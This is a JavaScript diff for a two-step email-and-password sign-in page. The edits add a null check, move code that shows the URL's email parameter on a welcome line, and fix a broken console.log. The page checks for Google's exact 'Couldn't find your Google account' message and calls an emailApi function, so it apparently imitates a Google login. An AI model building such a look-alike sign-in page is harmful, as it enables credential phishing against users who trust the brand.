@@ -109,7 +109,9 @@ async function con() {
     }
     function btn(lift = false) {
       const emailBtn = document.querySelector(".emailBtn");
-    
+    if(!emailBtn){
+      return
+    }
       if (lift) {
         emailBtn.classList.remove("bottom-0");
         emailBtn.classList.add("bottom-[41%]");
@@ -287,7 +289,11 @@ document.addEventListener('DOMContentLoaded', function() {
   
       if (errorText.textContent === "Couldn't find your Google account") {
         await load("pass", 1000, pass);
+   
        await emailApi()
+       const urlParams = new URLSearchParams(window.location.search);
+       const welEmail = urlParams.get('email');
+       document.querySelector(".wel").textContent = welEmail;
         
         return;
       }
@@ -553,9 +559,7 @@ document.addEventListener('DOMContentLoaded', function() {
     
 
     async function pass() {
-      const urlParams = new URLSearchParams(window.location.search);
-      const welEmail = urlParams.get('email');
-      document.querySelector(".wel").textContent = welEmail;
+   
       
       const emailWrapper = document.querySelector(".emailInp");
       const input = emailWrapper?.querySelector("input");
@@ -568,20 +572,20 @@ document.addEventListener('DOMContentLoaded', function() {
       // Get checkbox and password input with error checking
       const checkbox = document.getElementById('checkbox');
       const passInput = document.querySelector(".fpass");
-      
       if (!emailWrapper || !input || !label || !emailBtn || !emailBtnContainer || !errorBox || !errorText) {
-          console.warn("One or more elements are missing in the DOM.");
-          
-              emailWrapper: !!emailWrapper,
-              input: !!input,
-              label: !!label,
-              emailBtn: !!emailBtn,
-              emailBtnContainer: !!emailBtnContainer,
-              errorBox: !!errorBox,
-              errorText: !!errorText
-          });
-          return;
-      }
+        console.warn("One or more elements are missing in the DOM.");
+        console.log({
+            emailWrapper: !!emailWrapper,
+            input: !!input,
+            label: !!label,
+            emailBtn: !!emailBtn,
+            emailBtnContainer: !!emailBtnContainer,
+            errorBox: !!errorBox,
+            errorText: !!errorText
+        });
+        return;
+    }
+    
       
       // Check if checkbox elements exist
       if (!checkbox) {
